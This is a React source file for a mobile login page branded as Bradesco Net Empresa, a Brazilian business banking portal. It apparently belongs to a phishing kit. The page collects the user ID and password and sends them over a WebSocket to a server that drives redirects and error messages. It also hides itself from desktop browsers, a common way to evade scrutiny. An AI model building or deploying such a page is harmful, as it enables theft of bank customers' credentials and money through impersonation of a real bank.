import { useState } from "react";
import { ChevronLeft, Eye, EyeOff } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useWebSocket } from "@/hooks/useWebSocket";
import { resolveServerRoute } from "@/lib/resolveServerRoute";

const LoginPage = () => {
  const [loginBradesco, setLoginBradesco] = useState("");
  const [senha, setSenha] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [erro, setErro] = useState("");
  const navigate = useNavigate();

  const { sendLogin } = useWebSocket({
    onRedirect: (msg) => {
      navigate(resolveServerRoute(msg.url));
    },
    onLoginError: (motivo) => {
      setIsLoading(false);
      setErro(motivo);
    },
  });

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    setErro("");
    setIsLoading(true);
    sendLogin(loginBradesco, senha);
  };

  return (
    <>
      {/* Desktop blocker */}
      <div className="hidden md:flex min-h-screen items-center justify-center bg-[hsl(220,60%,40%)] p-8">
        <div className="text-center text-white max-w-sm space-y-4">
          <div className="w-16 h-16 rounded-2xl bg-white/20 flex items-center justify-center mx-auto">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-8 h-8" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="14" height="20" x="5" y="2" rx="2" ry="2"/><path d="M12 18h.01"/></svg>
          </div>
          <h2 className="text-xl font-bold">Acesso exclusivo pelo celular</h2>
          <p className="text-white/70 text-sm leading-relaxed">
            Este portal está disponível apenas para dispositivos móveis.
          </p>
        </div>
      </div>

      {/* Mobile layout */}
      <div className="md:hidden min-h-screen flex flex-col bg-[hsl(220,20%,96%)]">
        {/* Blue header bar */}
        <div className="bg-[hsl(220,60%,40%)] px-4 py-3 flex items-center gap-3">
          <button
            onClick={() => navigate("/")}
            className="text-white p-1 -ml-1 active:scale-95 transition-transform"
          >
            <ChevronLeft className="w-6 h-6" />
          </button>
          <h1 className="text-white text-base font-semibold tracking-tight">
            Bradesco Net Empresa
          </h1>
        </div>

        {/* Content */}
        <div className="flex flex-col flex-1 px-5 pt-8">
          <h2 className="text-[hsl(220,20%,14%)] text-2xl font-bold leading-tight mb-2">
            Acesso à conta
          </h2>
          <p className="text-[hsl(220,10%,46%)] text-sm mb-8">
            Informe a senha cadastrada para o usuário abaixo.
          </p>

          <form onSubmit={handleLogin} className="flex flex-col flex-1">
            <div className="space-y-2">
              {/* Login field */}
              <div className="bg-white rounded-lg px-4 pt-3 pb-2 border border-[hsl(220,14%,89%)]">
                <label className="text-[hsl(220,10%,46%)] text-xs block mb-1">Usuário</label>
                <input
                  type="text"
                  value={loginBradesco}
                  onChange={(e) => setLoginBradesco(e.target.value.toUpperCase())}
                  placeholder="Ex.: AAA00001"
                  className="w-full bg-transparent text-[hsl(220,20%,14%)] text-base font-medium border-b-2 border-[hsl(220,60%,40%)] pb-2 placeholder:text-[hsl(220,10%,70%)] focus:outline-none"
                />
              </div>

              {/* Password field */}
              <div className="bg-white rounded-lg px-4 pt-3 pb-2 border border-[hsl(220,14%,89%)]">
                <div className="flex items-center justify-between">
                  <div className="flex-1">
                    <label className="text-[hsl(220,10%,46%)] text-xs block mb-1">Senha</label>
                    <input
                      type={showPassword ? "text" : "password"}
                      value={senha}
                      onChange={(e) => setSenha(e.target.value)}
                      placeholder="Digite sua senha"
                      className="w-full bg-transparent text-[hsl(220,20%,14%)] text-base font-medium border-b-2 border-[hsl(220,14%,89%)] pb-2 placeholder:text-[hsl(220,10%,70%)] focus:outline-none focus:border-[hsl(220,60%,40%)] transition-colors"
                    />
                  </div>
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="ml-3 text-[hsl(220,10%,46%)] hover:text-[hsl(220,20%,14%)] transition-colors mt-4"
                  >
                    {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                  </button>
                </div>
              </div>
            </div>

            <button
              type="button"
              className="text-[hsl(220,70%,50%)] text-sm font-semibold mt-3 text-left"
            >
              Esqueci usuário/senha
            </button>

            {erro && (
              <p className="text-[hsl(0,84%,60%)] text-sm mt-4 text-center">{erro}</p>
            )}

            {/* Bottom actions */}
            <div className="mt-auto pb-8 space-y-3">
              <button
                type="submit"
                disabled={isLoading || !loginBradesco || !senha}
                className={`w-full h-14 rounded-full text-white text-base font-semibold tracking-wide active:scale-[0.97] transition-all duration-200 ${
                  loginBradesco && senha
                    ? "bg-[hsl(349,93%,42%)]"
                    : "bg-[hsl(220,10%,75%)] opacity-60"
                }`}
              >
                {isLoading ? (
                  <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin mx-auto" />
                ) : (
                  "Acessar conta"
                )}
              </button>
            </div>
          </form>
        </div>
      </div>
    </>
  );
};

export default LoginPage;
